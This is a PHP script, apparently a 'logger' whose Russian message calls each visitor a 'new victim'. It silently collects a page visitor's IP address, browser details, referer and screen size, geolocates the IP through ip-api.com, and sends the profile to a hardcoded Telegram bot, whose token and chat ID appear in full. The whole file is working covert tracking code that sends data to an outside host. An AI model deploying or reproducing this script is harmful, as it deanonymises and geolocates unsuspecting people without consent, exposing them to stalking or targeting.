<?php
$telegramBotToken = '7527469949:AAGi0lJoMcXi7EMMhZJ06gCiZOr4qEozsrU';
$chatId = '1971307009';

try {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $language = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
    $platform = $_SERVER['HTTP_USER_AGENT'];
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    $timezone = date_default_timezone_get();
    $city = 'Не доступно';
    $proxy = 'Не используется прокси';
    $screenWidth = isset($_GET['screenWidth']) ? $_GET['screenWidth'] : 'Не доступно';
    $screenHeight = isset($_GET['screenHeight']) ? $_GET['screenHeight'] : 'Не доступно';
    $onlineStatus = ($_SERVER['REQUEST_METHOD'] === 'POST') ? 'В сети' : 'Не в сети';

    $ipInfo = json_decode(file_get_contents("http://ip-api.com/json/{$ipAddress}"));
    if ($ipInfo && $ipInfo->status == 'success') {
        $city = $ipInfo->city;
        $region = $ipInfo->regionName;
        $country = $ipInfo->country;
        $org = $ipInfo->org;
    } else {
        $region = $country = $org = 'Не доступно';
    }

    $browserLang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'Не доступно';
    $acceptCharset = isset($_SERVER['HTTP_ACCEPT_CHARSET']) ? $_SERVER['HTTP_ACCEPT_CHARSET'] : 'Не доступно';
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Не доступно';
    $acceptEncoding = isset($_SERVER['HTTP_ACCEPT_ENCODING']) ? $_SERVER['HTTP_ACCEPT_ENCODING'] : 'Не доступно';

    $message = "🔔 Новая жертва Logger! 🔔\n\n";
    $message .= "📋 User-Agent: $userAgent\n";
    $message .= "🌍 Язык браузера: $language\n";
    $message .= "💻 Платформа устройства: $platform\n";
    $message .= "🌍 IP Адрес: $ipAddress\n";
    $message .= "🕰️ Часовой пояс: $timezone\n";
    $message .= "🌆 Город: $city\n";
    $message .= "🏙️ Регион: $region\n";
    $message .= "🌏 Страна: $country\n";
    $message .= "🏢 Организация: $org\n";
    $message .= "📏 Ширина экрана: $screenWidth\n";
    $message .= "📐 Высота экрана: $screenHeight\n";
    $message .= "📡 Статус сети: $onlineStatus\n";
    $message .= "📡 Тип подключения к прокси: $proxy\n";
    $message .= "🌍 Браузерный язык: $browserLang\n";
    $message .= "💬 Кодировка: $acceptCharset\n";
    $message .= "🌐 Реферер: $referer\n";
    $message .= "📡 Кодировка сжатия: $acceptEncoding\n";

    $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $response = curl_exec($ch);
    curl_close($ch);

    if ($response === false) {
        throw new Exception('Ошибка при отправке данных в Telegram');
    }

    echo "Информация отправлена в Telegram!";
} catch (Exception $e) {
    echo "Ошибка: " . $e->getMessage();
}
?>